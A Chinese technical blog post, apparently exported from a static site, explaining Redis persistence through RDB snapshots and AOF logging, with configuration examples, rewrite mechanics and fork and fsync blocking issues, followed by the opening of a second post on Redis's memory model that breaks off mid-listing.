—-摘自百度百科</p></blockquote><p>Redis的数据都是存储在内存中的，所以Redis持久化也就是要把Redis存储在内存中的数据保存到硬盘。</p><p>Redis有两种持久化的方式：快照（RDB文件）和追加式文件（AOF文件）。前者将当前数据保存到硬盘，后者则是将每次执行的写命令保存到硬盘（类似于MySQL的binlog）；由于AOF持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此AOF是目前主流的持久化方式，不过RDB持久化仍然有其用武之地。</p><ul><li>RDB持久化方式会在一个特定的间隔保存那个时间点的一个数据快照。</li><li>AOF持久化方式则会记录每一个服务器收到的写操作。在服务启动时，这些记录的操作会逐条执行从而重建出原来的数据。写操作命令记录的格式跟Redis协议一致，以追加的方式进行保存。</li><li>Redis的持久化是可以禁用的，就是说你可以让数据的生命周期只存在于服务器的运行时间里。</li><li>两种方式的持久化是可以同时存在的，但是当Redis重启时，AOF文件会被优先用于重建数据。</li></ul><h3 id="RDB持久化"><a href="#RDB持久化" class="headerlink" title="RDB持久化"></a>RDB持久化</h3><p>RDB持久化是指在客户端输入<strong>save</strong>、<strong>bgsave</strong>或者达到配置文件自动保存快照条件时，将Redis 在内存中的数据生成快照保存在名字为 dump.rdb（文件名可修改）的二进制文件中。</p><h4 id="创建与载入"><a href="#创建与载入" class="headerlink" title="创建与载入"></a>创建与载入</h4><p>RDB文件可以通过两个命令来生成：</p><ul><li><strong>SAVE</strong>：save命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在Redis服务器阻塞期间，服务器不能处理任何命令请求。</li><li><strong>BGSAVE</strong>：派生(fork)一个子进程来创建新的RDB文件，记录接收到BGSAVE当时的数据库状态，父进程继续处理接收到的命令，子进程完成文件的创建之后，会发送信号给父进程，而与此同时，父进程处理命令的同时，通过轮询来接收子进程的信号。</li></ul><p>bgsave执行流程图:</p><img src="/2019/04/05/2019-04-05-深入学习Redis之持久化/pic3.png"><blockquote><p>注：bgsave命令执行期间 SAVE命令会被拒绝 不能同时执行两个BGSAVE命令 不能同时执行BGREWRITEAOF和BGSAVE命令</p></blockquote><p>RDB文件的载入一般情况是自动的，redis服务器启动的时候如果检测到RDB文件的存在，那么redis会自动载入这个文件。</p><p>如果服务器开启了AOF持久化，那么服务器会优先使用AOF文件来还原数据库状态。</p><p>RDB是通过保存键值对来记录数据库状态的，采用copy on write的模式，每次都是全量的备份。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>BGSAVE可以在不阻塞主进程的情况下完成数据的备份。可以通过redis.conf中设置多个自动保存条件，只要有一个条件被满足，服务器就会执行BGSAVE命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 触发自动保存快照</span><br><span class="line"># save &lt;seconds&gt; &lt;changes&gt;</span><br><span class="line">save 900 1    # 900 秒内有至少有 1 个键被改动</span><br><span class="line">save 300 10   # 300 秒内有至少有 10 个键被改动</span><br><span class="line">save 60 10000 # 60 秒内有至少有 1000 个键被改动</span><br><span class="line"></span><br><span class="line"># 设置在保存快照出错时，是否停止redis命令的写入</span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line"></span><br><span class="line"># 是否在导出.rdb数据库文件的时候采用LZF压缩</span><br><span class="line">rdbcompression yes</span><br><span class="line"></span><br><span class="line">#  是否开启CRC64校验</span><br><span class="line">rdbchecksum yes</span><br><span class="line"></span><br><span class="line"># 导出数据库的文件名称</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"># 导出的数据库所在的目录</span><br><span class="line">dir ./</span><br></pre></td></tr></table></figure><h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点：</p><ul><li>RDB是一个非常紧凑（有压缩）的文件,它保存了某个时间点的数据,非常适用于数据的备份。</li><li>RDB作为一个非常紧凑（有压缩）的文件，可以很方便传送到另一个远端数据中心 ，非常适用于灾难恢复.</li><li>RDB在保存RDB文件时父进程唯一需要做的就是fork出一个子进程,接下来的工作全部由子进程来做，父进程不需要再做其他IO操作，所以RDB持久化方式可以最大化redis的性能.</li><li>与AOF相比,在恢复大的数据集的时候，RDB方式会更快一些.</li></ul><p>缺点：</p><ul><li>RDB容易造成数据的丢失。假设每5分钟保存一次快照，如果Redis因为某些原因不能正常工作，那么从上次产生快照到Redis出现问题这段时间的数据就会丢失了。</li><li>RDB使用<strong>fork()</strong>产生子进程进行数据的持久化，如果数据比较大的话可能就会花费点时间，造成Redis停止服务几毫秒。如果数据量很大且CPU性能不是很好的时候，停止服务的时间甚至会到1秒。</li></ul><h3 id="AOF持久化"><a href="#AOF持久化" class="headerlink" title="AOF持久化"></a>AOF持久化</h3><p>快照并不是很可靠。如果你的电脑突然宕机了，或者电源断了，又或者不小心杀掉了进程，那么最新的数据就会丢失。而AOF文件则提供了一种更为可靠的持久化方式。</p><p>AOF持久化（Append-Only-File），与RDB持久化不同，AOF持久化是通过保存Redis服务器锁执行的写状态来记录数据库的。每当Redis接受到会修改数据集的命令时，就会把命令追加到AOF文件里，当你重启Redis时，AOF里的命令会被重新执行一次，重建数据。</p><p>具体来说，RDB持久化相当于备份数据库状态，而AOF持久化是备份数据库接收到的命令，所有被写入AOF的命令都是以redis的协议格式来保存的。</p><p>在AOF持久化的文件中，数据库会记录下所有变更数据库状态的命令，除了指定数据库的select命令，其他的命令都是来自client的，这些命令会以追加(append)的形式保存到文件中。</p><h4 id="开启AOF持久化"><a href="#开启AOF持久化" class="headerlink" title="开启AOF持久化"></a>开启AOF持久化</h4><p>修改redis.conf配置文件，默认是appendonly no（关闭状态），将no改为yes即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure><p>在客户端输入如下命令也可，但是Redis服务器重启后会失效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set appendonly yes</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>接下来看看AOF持久化功能的实现</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>AOF持久化功能的实现可以分为命令追加（append）、文件写入和文件同步（sync）三个步骤。下面就是三个步骤的整个过程。</p><p>在Redis客户端输入如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set learnRedis testAOF</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>appendonly.aof文件会增加如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$6</span><br><span class="line">SELECT</span><br><span class="line">$1</span><br><span class="line">0</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">learnRedis</span><br><span class="line">$7</span><br><span class="line">testAOF</span><br></pre></td></tr></table></figure><h5 id="命令追加"><a href="#命令追加" class="headerlink" title="命令追加"></a>命令追加</h5><p>AOF持久化功能开启时，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器状态的aof_buf缓冲区的末尾。此时缓冲区的记录还没有写入到appendonly.aof文件中。</p><h5 id="文件的写入和同步"><a href="#文件的写入和同步" class="headerlink" title="文件的写入和同步"></a>文件的写入和同步</h5><p>为什么将文件写入和文件同步合在一块讲呢？因为配置文件中提供了一个appendfsync参数，这个参数控制着文件写入和同步的行为。</p><p>关于文件的写入和同步的资料如下</p><blockquote><p>因为为了提高文件的写入效率，在现代操作系统中，当用户调用write函数，将一些数据写入到文件的时候，os通常会将写入数据暂时保存在一个内存缓冲区里面（例如，unix系统实现在内核中设有缓冲区高速缓存或页高速缓存，当我们向文件写入数据时，内核通常先将数据复制到缓冲区中，然后排入队列，晚些时候再写入磁盘），这种方式称为延迟写，等到缓冲区的空间被填满，或者超过了指定的时限，或者内核需要重用缓冲区存放其它磁盘块数据时，才会真正将缓冲区中的所有数据写入到磁盘里面。</p></blockquote><p>简单来说就是</p><ul><li>文件写入：只是写入到了内存缓冲区，可能还没有写到文件所拥有的磁盘数据块上</li><li>文件同步：将缓冲区中的内容冲洗到磁盘上</li></ul><p>你可以配置Redis调用fsync的频率，有三个选项：</p><ul><li>每当有新命令追加到AOF的时候调用fsync。速度最慢，但是最安全。</li><li>每秒fsync一次。速度快（2.4版本跟快照方式速度差不多），安全性不错（最多丢失1秒的数据）。</li><li>从不fsync，交由系统去处理。这个方式速度最快，但是安全性一般。</li></ul><p>推荐使用每秒fsync一次的方式（默认的方式），因为它速度快，安全性也不错。参数如下：</p><table><thead><tr><th>appendfsync</th><th>效果</th></tr></thead><tbody><tr><td>always</td><td>每次有新命令时，就将缓冲区数据写入并同步到 AOF 文件）</td></tr><tr><td>everysec</td><td>每秒将缓冲区的数据写入并同步到 AOF 文件</td></tr><tr><td>no</td><td>将缓冲区数据写入AOF 文件，但是同步操作到交给操作系统来处理</td></tr></tbody></table><h4 id="载入与数据还原"><a href="#载入与数据还原" class="headerlink" title="载入与数据还原"></a>载入与数据还原</h4><p>读取AOF文件并还原数据库的步骤如下</p><ol><li>创建一个不带网络连接的伪客户端</li><li>从AOF文件中分析并读取出一条写命令</li><li>使用伪客户端执行被读出的写命令</li><li>一直执行步骤2、3，直到AOF文件中的所有写命令都被处理完毕为止</li></ol><img src="/2019/04/05/2019-04-05-深入学习Redis之持久化/pic1.png"><p>这时可能会出现一个问题。服务器可能在程序正在对 AOF 文件进行写入时停机，造成了 AOF 文件出错，那么 Redis 在重启时会拒绝载入这个 AOF 文件，从而确保数据的一致性不会被破坏 当发生这种情况时， 可以用以下方法来修复出错的 AOF 文件：</p><ul><li>为现有的 AOF 文件创建一个备份。</li><li>使用 Redis 附带的 redis-check-aof 程序，对原来的 AOF 文件进行修复: redis-check-aof –fix</li><li>（可选）使用 diff -u 对比修复后的 AOF 文件和原始 AOF 文件的备份，查看两个文件之间的不同之处。</li><li>重启 Redis 服务器，等待服务器载入修复后的 AOF 文件，并进行数据恢复。</li></ul><p>另外redis.conf配置文件中还提供了一个参数来控制是否忽略最后一条可能存在问题的指令，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aof-load-truncated yes</span><br></pre></td></tr></table></figure><h4 id="日志重写"><a href="#日志重写" class="headerlink" title="日志重写"></a>日志重写</h4><p>随着写操作的不断增加，AOF文件会越来越大。例如你递增一个计数器100次，那么最终结果就是数据集里的计数器的值为最终的递增结果，但是AOF文件里却会把这100次操作完整的记录下来。而事实上要恢复这个记录，只需要1个命令就行了，也就是说AOF文件里那100条命令其实可以精简为1条。所以Redis支持这样一个功能：在不中断服务的情况下在后台重建AOF文件。</p><p>AOF重写机制的触发有两种机制，一个是通过调用命令BGREWRITEAOF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; BGREWRITEAOF</span><br><span class="line">Background append only file rewriting started</span><br></pre></td></tr></table></figure><p>另一种是根据配置文件中的参数触发，参数如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto-aof-rewrite-percentage 100 #当前AOF文件大小和上一次重写时AOF文件大小的比值</span><br><span class="line">auto-aof-rewrite-min-size 64mb  #文件的最小体积</span><br></pre></td></tr></table></figure><p>服务端会出现如下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1349:M 30 Jul 17:19:25.311 * Background append only file rewriting started by pid 1392</span><br><span class="line">1349:M 30 Jul 17:19:25.379 * AOF rewrite child asks to stop sending diffs.</span><br><span class="line">1392:C 30 Jul 17:19:25.379 * Parent agreed to stop sending diffs. Finalizing AOF...</span><br><span class="line">1392:C 30 Jul 17:19:25.380 * Concatenating 0.00 MB of AOF diff received from parent.</span><br><span class="line">1392:C 30 Jul 17:19:25.380 * SYNC append only file rewrite performed</span><br><span class="line">1392:C 30 Jul 17:19:25.381 * AOF rewrite: 4 MB of memory used by copy-on-write</span><br><span class="line">1349:M 30 Jul 17:19:25.466 * Background AOF rewrite terminated with success</span><br><span class="line">1349:M 30 Jul 17:19:25.467 * Residual parent diff successfully flushed to the rewritten AOF (0.00 MB)</span><br><span class="line">1349:M 30 Jul 17:19:25.467 * Background AOF rewrite finished successfully</span><br></pre></td></tr></table></figure><p>重写步骤</p><ul><li>Redis调用fork()，产生一个子进程。</li><li>子进程把新的AOF写到一个临时文件里。</li><li>主进程持续把新的变动写到内存里的buffer，同时也会把这些新的变动写到旧的AOF里，这样即使重写失败也能保证数据的安全。</li><li>当子进程完成文件的重写后，主进程会获得一个信号，然后把内存里的buffer追加到子进程生成的那个新AOF里。</li><li>对新的AOF文件进行改名，原子的覆盖现有的AOF文件。</li></ul><p>文件重写流程图：</p><img src="/2019/04/05/2019-04-05-深入学习Redis之持久化/pic4.png"><p>AOF重写功能有大量写入操作，所以redis才用子进程来处理AOF重写。这里带来一个新的问题，由于处理重新的是子进程，这样意味着如果主线程的数据在此时被修改，备份的数据和主库的数据将会有不一致的情况发生。因此redis还设置了一个AOF重写缓冲区，这个缓冲区在子进程被创建开始之后开始使用，这个期间，所有的命令会被存两份，一份在AOF缓存空间，一份在AOF重写缓冲区，当AOF重写完成之后，子进程发送信号给主进程，通知主进程将AOF重写缓冲区的内容添加到AOF文件中。</p><p>注：AOF重写不需要对现有的AOF文件进行任何读取、分析和写入操作。</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 是否开启AOF功能</span><br><span class="line">appendonly no</span><br><span class="line"></span><br><span class="line"># AOF文件件名称</span><br><span class="line">appendfilename &quot;appendonly.aof&quot;</span><br><span class="line"></span><br><span class="line"># 写入AOF文件的三种方式</span><br><span class="line"># appendfsync always</span><br><span class="line">appendfsync everysec</span><br><span class="line"># appendfsync no</span><br><span class="line"></span><br><span class="line"># 重写AOF时，是否继续写AOF文件</span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"></span><br><span class="line"># 自动重写AOF文件的条件</span><br><span class="line">auto-aof-rewrite-percentage 100 #百分比</span><br><span class="line">auto-aof-rewrite-min-size 64mb #大小</span><br><span class="line"></span><br><span class="line"># 是否忽略最后一条可能存在问题的指令</span><br><span class="line">aof-load-truncated yes</span><br></pre></td></tr></table></figure><h4 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点：</p><ul><li>比RDB可靠。你可以制定不同的fsync策略：不进行fsync、每秒fsync一次和每次查询进行fsync。默认是每秒fsync一次。这意味着你最多丢失一秒钟的数据。</li><li>AOF日志文件是一个纯追加的文件。就算是遇到突然停电的情况，也不会出现日志的定位或者损坏问题。甚至如果因为某些原因（例如磁盘满了）命令只写了一半到日志文件里，我们也可以用<strong>redis-check-aof</strong>这个工具很简单的进行修复。</li><li>当AOF文件太大时，Redis会自动在后台进行重写。重写很安全，因为重写是在一个新的文件上进行，同时Redis会继续往旧的文件追加数据。新文件上会写入能重建当前数据集的最小操作命令的集合。当新文件重写完，Redis会把新旧文件进行切换，然后开始把数据写到新文件上。</li><li>AOF把操作命令以简单易懂的格式一条接一条的保存在文件里，很容易导出来用于恢复数据。例如我们不小心用<strong>FLUSHALL</strong>命令把所有数据刷掉了，只要文件没有被重写，我们可以把服务停掉，把最后那条命令删掉，然后重启服务，这样就能把被刷掉的数据恢复回来。</li></ul><p>缺点：</p><ul><li>在相同的数据集下，AOF文件的大小一般会比RDB文件大。</li><li>在某些fsync策略下，AOF的速度会比RDB慢。通常fsync设置为每秒一次就能获得比较高的性能，而在禁止fsync的情况下速度可以达到RDB的水平。</li><li>在过去曾经发现一些很罕见的BUG导致使用AOF重建的数据跟原数据不一致的问题。</li></ul><h3 id="方案选择与常见问题"><a href="#方案选择与常见问题" class="headerlink" title="方案选择与常见问题"></a>方案选择与常见问题</h3><h4 id="持久化策略选择"><a href="#持久化策略选择" class="headerlink" title="持久化策略选择"></a>持久化策略选择</h4><p>在介绍持久化策略之前，首先要明白无论是RDB还是AOF，持久化的开启都是要付出性能方面代价的：</p><ul><li>对于RDB持久化，一方面是bgsave在进行fork操作时Redis主进程会阻塞，另一方面，子进程向硬盘写数据也会带来IO压力；</li><li>对于AOF持久化，向硬盘写数据的频率大大提高(everysec策略下为秒级)，IO压力更大，甚至可能造成AOF追加阻塞问题（后面会详细介绍这种阻塞）；</li><li>此外，AOF文件的重写与RDB的bgsave类似，会有fork时的阻塞和子进程的IO压力问题。相对来说，由于AOF向硬盘中写数据的频率更高，因此对Redis主进程性能的影响会更大。</li></ul><p>在实际生产环境中，根据数据量、应用对数据的安全要求、预算限制等不同情况，会有各种各样的持久化策略；如完全不使用任何持久化、使用RDB或AOF的一种，或同时开启RDB和AOF持久化等。此外，持久化的选择必须与Redis的主从策略一起考虑，因为主从复制与持久化同样具有数据备份的功能，而且主机master和从机slave可以独立的选择持久化方案。</p><p>下面分场景来讨论持久化策略的选择，下面的讨论也只是作为参考，实际方案可能更复杂更具多样性。</p><p>（1）如果Redis中的数据完全丢弃也没有关系（如Redis完全用作DB层数据的cache），那么无论是单机，还是主从架构，都可以不进行任何持久化。</p><p>（2）在单机环境下（对于个人开发者，这种情况可能比较常见），如果可以接受十几分钟或更多的数据丢失，选择RDB对Redis的性能更加有利；如果只能接受秒级别的数据丢失，应该选择AOF。</p><p>（3）但在多数情况下，我们都会配置主从环境，slave的存在既可以实现数据的热备，也可以进行读写分离分担Redis读请求，以及在master宕掉后继续提供服务。在这种情况下，一种可行的做法是：</p><ul><li>master：完全关闭持久化（包括RDB和AOF），这样可以让master的性能达到最好</li><li>slave：关闭RDB，开启AOF（如果对数据安全要求不高，开启RDB关闭AOF也可以），并定时对持久化文件进行备份（如备份到其他文件夹，并标记好备份的时间）；然后关闭AOF的自动重写，然后添加定时任务，在每天Redis闲时（如凌晨12点）调用bgrewriteaof。</li></ul><p>这里需要解释一下，为什么开启了主从复制，可以实现数据的热备份，还需要设置持久化呢？因为在一些特殊情况下，主从复制仍然不足以保证数据的安全，例如：</p><ul><li>master和slave进程同时停止：考虑这样一种场景，如果master和slave在同一栋大楼或同一个机房，则一次停电事故就可能导致master和slave机器同时关机，Redis进程停止；如果没有持久化，则面临的是数据的完全丢失。</li><li>master误重启：考虑这样一种场景，master服务因为故障宕掉了，如果系统中有自动拉起机制（即检测到服务停止后重启该服务）将master自动重启，由于没有持久化文件，那么master重启后数据是空的，slave同步数据也变成了空的；如果master和slave都没有持久化，同样会面临数据的完全丢失。需要注意的是，即便是使用了哨兵(关于哨兵后面会有文章介绍)进行自动的主从切换，也有可能在哨兵轮询到master之前，便被自动拉起机制重启了。因此，应尽量避免“自动拉起机制”和“不做持久化”同时出现。</li></ul><p>（4）异地灾备：上述讨论的几种持久化策略，针对的都是一般的系统故障，如进程异常退出、宕机、断电等，这些故障不会损坏硬盘。但是对于一些可能导致硬盘损坏的灾难情况，如火灾地震，就需要进行异地灾备。例如对于单机的情形，可以定时将RDB文件或重写后的AOF文件，通过scp拷贝到远程机器，如阿里云、AWS等；对于主从的情形，可以定时在master上执行bgsave，然后将RDB文件拷贝到远程机器，或者在slave上执行bgrewriteaof重写AOF文件后，将AOF文件拷贝到远程机器上。一般来说，由于RDB文件文件小、恢复快，因此灾难恢复常用RDB文件；异地备份的频率根据数据安全性的需要及其他条件来确定，但最好不要低于一天一次。</p><h4 id="fork阻塞：CPU的阻塞"><a href="#fork阻塞：CPU的阻塞" class="headerlink" title="fork阻塞：CPU的阻塞"></a>fork阻塞：CPU的阻塞</h4><p>在Redis的实践中，众多因素限制了Redis单机的内存不能过大，例如：</p><ul><li>当面对请求的暴增，需要从库扩容时，Redis内存过大会导致扩容时间太长；</li><li>当主机宕机时，切换主机后需要挂载从库，Redis内存过大导致挂载速度过慢；</li><li>以及持久化过程中的fork操作，下面详细说明。</li></ul><p>首先说明一下fork操作：</p><ul><li>父进程通过fork操作可以创建子进程；子进程创建后，父子进程共享代码段，不共享进程的数据空间，但是子进程会获得父进程的数据空间的副本。</li><li>在操作系统fork的实际实现中，基本都采用了写时复制技术，即在父/子进程试图修改数据空间之前，父子进程实际上共享数据空间；但是当父/子进程的任何一个试图修改数据空间时，操作系统会为修改的那一部分(内存的一页)制作一个副本。</li><li>虽然fork时，子进程不会复制父进程的数据空间，但是会复制内存页表（页表相当于内存的索引、目录）；父进程的数据空间越大，内存页表越大，fork时复制耗时也会越多。</li></ul><p>在Redis中，无论是RDB持久化的bgsave，还是AOF重写的bgrewriteaof，都需要fork出子进程来进行操作。如果Redis内存过大，会导致fork操作时复制内存页表耗时过多；而Redis主进程在进行fork时，是完全阻塞的，也就意味着无法响应客户端的请求，会造成请求延迟过大。</p><p>对于不同的硬件、不同的操作系统，fork操作的耗时会有所差别，一般来说，如果Redis单机内存达到了10GB，fork时耗时可能会达到百毫秒级别（如果使用Xen虚拟机，这个耗时可能达到秒级别）。因此，一般来说Redis单机内存一般要限制在10GB以内；不过这个数据并不是绝对的，可以通过观察线上环境fork的耗时来进行调整。观察的方法如下：执行命令info stats，查看latest_fork_usec的值，单位为微秒。</p><p>为了减轻fork操作带来的阻塞问题，除了控制Redis单机内存的大小以外，还可以适度放宽AOF重写的触发条件、选用物理机或高效支持fork操作的虚拟化技术等，例如使用Vmware或KVM虚拟机，不要使用Xen虚拟机。</p><h4 id="AOF追加阻塞：硬盘的阻塞"><a href="#AOF追加阻塞：硬盘的阻塞" class="headerlink" title="AOF追加阻塞：硬盘的阻塞"></a>AOF追加阻塞：硬盘的阻塞</h4><p>前面提到过，在AOF中，如果AOF缓冲区的文件同步策略为everysec，则：在主线程中，命令写入aof_buf后调用系统write操作，write完成后主线程返回；fsync同步文件操作由专门的文件同步线程每秒调用一次。</p><p>这种做法的问题在于，如果硬盘负载过高，那么fsync操作可能会超过1s；如果Redis主线程持续高速向aof_buf写入命令，硬盘的负载可能会越来越大，IO资源消耗更快；如果此时Redis进程异常退出，丢失的数据也会越来越多，可能远超过1s。</p><p>为此，Redis的处理策略是这样的：主线程每次进行AOF会对比上次fsync成功的时间；如果距上次不到2s，主线程直接返回；如果超过2s，则主线程阻塞直到fsync同步完成。因此，如果系统硬盘负载过大导致fsync速度太慢，会导致Redis主线程的阻塞；此外，使用everysec配置，AOF最多可能丢失2s的数据，而不是1s。</p><p>AOF追加阻塞问题定位的方法：</p><p>（1）监控info Persistence中的aof_delayed_fsync：当AOF追加阻塞发生时（即主线程等待fsync而阻塞），该指标累加。</p><p>（2）AOF阻塞时的Redis日志：</p><blockquote><p>Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.</p></blockquote><p>（3）如果AOF追加阻塞频繁发生，说明系统的硬盘负载太大；可以考虑更换IO速度更快的硬盘，或者通过IO监控分析工具对系统的IO负载进行分析，如iostat（系统级io）、iotop（io版的top）、pidstat等。</p><h4 id="info命令与持久化"><a href="#info命令与持久化" class="headerlink" title="info命令与持久化"></a>info命令与持久化</h4><p>前面提到了一些通过info命令查看持久化相关状态的方法，下面来总结一下。</p><h5 id="info-Persistence"><a href="#info-Persistence" class="headerlink" title="info Persistence"></a>info Persistence</h5><p>执行结果如下：</p><img src="/2019/04/05/2019-04-05-深入学习Redis之持久化/pic2.png"><p>其中比较重要的包括：</p><ul><li>rdb_last_bgsave_status:上次bgsave 执行结果，可以用于发现bgsave错误</li><li>rdb_last_bgsave_time_sec:上次bgsave执行时间（单位是s），可以用于发现bgsave是否耗时过长</li><li>aof_enabled:AOF是否开启</li><li>aof_last_rewrite_time_sec: 上次文件重写执行时间（单位是s），可以用于发现文件重写是否耗时过长</li><li>aof_last_bgrewrite_status: 上次bgrewrite执行结果，可以用于发现bgrewrite错误</li><li>aof_buffer_length和aof_rewrite_buffer_length:aof缓存区大小和aof重写缓冲区大小</li><li>aof_delayed_fsync:AOF追加阻塞情况的统计</li></ul><h5 id="info-stats"><a href="#info-stats" class="headerlink" title="info stats"></a>info stats</h5><p>其中与持久化关系较大的是：latest_fork_usec，代表上次fork耗时，可以参见前面的讨论。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文主要内容可以总结如下：</p><ul><li>持久化在Redis高可用中的作用：数据备份，与主从复制相比强调的是由内存到硬盘的备份。</li><li>RDB持久化：将数据快照备份到硬盘；介绍了其触发条件（包括手动出发和自动触发）、执行流程、RDB文件等，特别需要注意的是文件保存操作由fork出的子进程来进行。</li><li>AOF持久化：将执行的写命令备份到硬盘（类似于MySQL的binlog），介绍了其开启方法、执行流程等，特别需要注意的是文件同步策略的选择（everysec）、文件重写的流程。</li><li>一些现实的问题：包括如何选择持久化策略，以及需要注意的fork阻塞、AOF追加阻塞等。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入学习Redis之内存模型</title>
      <link href="/2019/04/04/2019-04-04-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"/>
      <url>/2019/04/04/2019-04-04-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 进一步了解Redis的内存模型 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>Redis是目前最火爆的内存数据库之一，通过在内存中读写数据，大大提高了读写速度，可以说Redis是实现网站高并发不可或缺的一部分。</p><p>我们使用Redis时，会接触Redis的5种对象类型：字符串、哈希、列表、集合、有序集合。丰富的类型是Redis相对于Memcached等的一大优势。在了解了Redis 5种对象类型用法和特点的基础上，进一步了解Redis的内存模型，对Redis的使用会有很大帮助，例如：</p><ul><li><strong>估算Redis内存使用量。</strong>目前为止，内存的使用成本仍然相对较高，使用内存不能无所顾忌；根据需求合理的评估Redis的内存使用量，选择合适的机器配置，可以在满足需求的情况下节约成本。</li><li><strong>优化内存占用。</strong>了解Redis内存模型可以选择更合适的数据类型和编码，更好的利用Redis内存。</li><li><strong>分析解决问题。</strong>当Redis出现阻塞、内存占用等问题时，尽快发现导致问题的原因，便于分析解决问题。</li></ul><p>本文主要介绍以3.0为例的Redis的内存模型，包括：Redis占用内存的情况及如何查询、不同的对象类型在内存中的编码方式、内存分配器（jemalloc）、简单动态字符串（SDS）、RedisObject等。然后在此基础上介绍几个Redis内存模型的应用。</p><h3 id="Redis内存统计"><a href="#Redis内存统计" class="headerlink" title="Redis内存统计"></a>Redis内存统计</h3><p>工欲善其事必先利其器，在说明Redis内存之前，首先说明如何统计Redis使用内存的情况是很有必要的。</p><p>在客户端通过redis-cli连接服务器后（后面如无特殊说明，客户端一律使用redis-cli），通过info命令可以查看内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">test:22122&gt; info memory</span><br><span class="line"># Memory</span><br><span class="line">used_memory:712474040</span><br><span class="line">used_memory_human:679.47M</span><br><span class="line">used_memory_rss:765263872</span><br><span class="line">used_memory_peak:800496888</span><br><span class="line">used_memory_peak_human:763.41M</span><br><span class="line">used_memory_lua:36864</span><br><span class="line">mem_fragmentation_ratio:1.07</span><br><span 